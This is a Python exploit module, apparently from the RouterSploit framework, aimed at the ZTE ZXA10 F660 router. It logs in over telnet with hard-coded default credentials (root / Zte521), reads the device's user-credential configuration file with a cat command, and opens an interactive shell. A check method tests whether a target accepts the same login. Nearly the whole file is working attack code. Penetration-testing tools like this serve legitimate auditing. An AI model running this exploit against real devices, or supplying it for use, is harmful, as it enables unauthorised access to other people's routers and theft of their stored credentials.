import telnetlib

from routersploit import (
    exploits,
    print_success,
    print_error,
)


class Exploit(exploits.Exploit):
    """
    Exploit implementation for ZTE F660 config disclosure vulnerability.
    If the target is vulnerable it is possible to authenticate to the device"
    """
    __info__ = {
        'name': 'ZTE F660 Config Disclosure',
        'description': 'Module exploits ZTE F660 config disclosure vulnerability. If the target is is possible to authentiate to the device.',
        'authors': [
            'devilscream',  # vulnerability discovery
            'Marcin Bury <marcin.bury[at]reverse-shell.com>',  # routersploit module
        ],
        'references': [
            '',
        ],
        'devices': [
            'ZTE ZXA10 F660'
        ]
    }

    target = exploits.Option('', 'Target address e.g. 192.168.1.1')  # target address

    username = "root"
    password = "Zte521"
    config = "cat /userconfig/cfg/db_user_cfg.xml"

    def run(self):
        try:
            tn = telnetlib.Telnet(self.target, 23)
            tn.expect(["Login: ", "login: "], 5)
            tn.write(self.username + "\r\n")
            tn.expect(["Password: ", "password"], 5)
            tn.write(self.password + "\r\n")
            tn.write("\r\n")

            (i, obj, res) = tn.expect(["Incorrect", "incorrect"], 5)

            if i != -1:
                return False
            else:
                if any(map(lambda x: x in res, ["#", "$", ">"])):
                    print_success("Telnet - Successful authentication")
                    tn.write(self.config + "\r\n")
                    tn.interact()

            tn.close()
        except:
            print_error("Connection Error")
            return

    def check(self):
        try:
            tn = telnetlib.Telnet(self.target, 23)
            tn.expect(["Login: ", "login: "], 5)
            tn.write(self.username + "\r\n")
            tn.expect(["Password: ", "password"], 5)
            tn.write(self.password + "\r\n")
            tn.write("\r\n")

            (i, obj, res) = tn.expect(["Incorrect", "incorrect"], 5)
            tn.close()

            if i != -1:
                return False
            else:
                if any(map(lambda x: x in res, ["#", "$", ">"])):
                    tn.close()
                    return True
            tn.close()
        except:
            return False

        return False